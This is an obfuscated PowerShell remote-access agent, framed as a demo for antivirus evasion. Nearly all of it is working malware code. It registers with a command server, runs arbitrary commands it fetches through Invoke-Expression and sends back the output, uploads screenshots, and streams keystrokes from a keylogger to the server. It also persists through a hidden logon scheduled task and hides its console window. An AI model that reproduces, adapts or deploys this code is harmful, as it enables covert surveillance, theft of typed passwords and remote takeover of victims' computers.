# Obfuscated PowerShell agent for demo/AV evasion
# (For educational/project use only)

${___} = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovLzxZT1VSX0JBQ0tFTkRfSVA+OzxQT1JUPg==')).Replace('<YOUR_BACKEND_IP>', '<YOUR_BACKEND_IP>').Replace('<PORT>', '<PORT>')
${__} = "$env:COMPUTERNAME-$([int](Get-Random))"
${_} = 5
${____} = $MyInvocation.MyCommand.Definition
${_____} = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SmF2YUMyQWdlbnREZW1v'))

function _0{try{Unregister-ScheduledTask -TaskName ${_____} -Confirm:$false -ErrorAction SilentlyContinue|Out-Null;$a=New-ScheduledTaskAction -Execute ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG93ZXJzaGVsbC5leGU='))) -Argument "-ExecutionPolicy Bypass -File `"${____}`" -Hidden";$t=New-ScheduledTaskTrigger -AtLogOn;Register-ScheduledTask -TaskName ${_____} -Action $a -Trigger $t -Description ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SmF2YUMyIEFnZW50IERlbW8gUGVyc2lzdGVuY2U='))) -Force}catch{}}
function _1{try{Unregister-ScheduledTask -TaskName ${_____} -Confirm:$false -ErrorAction SilentlyContinue|Out-Null}catch{}}
function _2{$b=@{agentId=${__};agentOs="Windows"}|ConvertTo-Json;Invoke-RestMethod -Uri ("${___}/agents/register") -Method Post -Body $b -ContentType "application/json"}
function _3{Invoke-RestMethod -Uri ("${___}/commands/agents/${__}") -Method Get}
function _4($c,$d){$e=@{agentId=${__};commandId=$c;result=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($d))}|ConvertTo-Json;Invoke-RestMethod -Uri ("${___}/results") -Method Post -Body $e -ContentType "application/json"}
function _5{$f="$env:TEMP\shot.png";Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing;$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$bm=New-Object System.Drawing.Bitmap $b.Width,$b.Height;$g=[System.Drawing.Graphics]::FromImage($bm);$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);$bm.Save($f,[System.Drawing.Imaging.ImageFormat]::Png);$h=[System.IO.File]::ReadAllBytes($f);$i=[Convert]::ToBase64String($h);$j=@{agentId=${__};screenshot=$i}|ConvertTo-Json;Invoke-RestMethod -Uri ("${___}/screenshots") -Method Post -Body $j -ContentType "application/json";Remove-Item $f}
function _6($k){$l=@{agentId=${__};logText=$k}|ConvertTo-Json;Invoke-RestMethod -Uri ("${___}/keylogger/log") -Method Post -Body $l -ContentType "application/json"}
function _7{(Invoke-RestMethod -Uri ("${___}/keylogger/status/${__}") -Method Get).enabled}
function _8{$global:__b="";$global:__c=$true;[void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms");[void][System.Reflection.Assembly]::LoadWithPartialName("System.Drawing");$h={param($s,$e)$global:__b+=$e.KeyCode+" ";if($global:__b.Length-gt 100){_6 $global:__b;$global:__b=""}};$f=New-Object Windows.Forms.Form;$f.Add_KeyDown($h);$f.ShowDialog()}
param([switch]$Persist,[switch]$RemovePersist,[switch]$Hidden)
if($Hidden){try{Add-Type -Name Win -Namespace PS -MemberDefinition '[DllImport("user32.dll")]public static extern bool ShowWindow(int hWnd,int nCmdShow);[DllImport("kernel32.dll")]public static extern int GetConsoleWindow();';[void][PS.Win]::ShowWindow([PS.Win]::GetConsoleWindow(),0)}catch{}}
if($Persist){_0;exit}
if($RemovePersist){_1;exit}
_2
while($true){try{$a=_7;if($a-and-not $global:__d){Start-Job -ScriptBlock{_8}|Out-Null;$global:__d=$true}elseif(-not $a-and $global:__d){Get-Job|Remove-Job -Force;$global:__d=$false}$b=_3;foreach($c in $b){$d=Invoke-Expression $c.command;_4 $c.id $d}if($b|Where-Object{$_.command-eq'screenshot'}){_5}Start-Sleep -Seconds ${_}}catch{}} 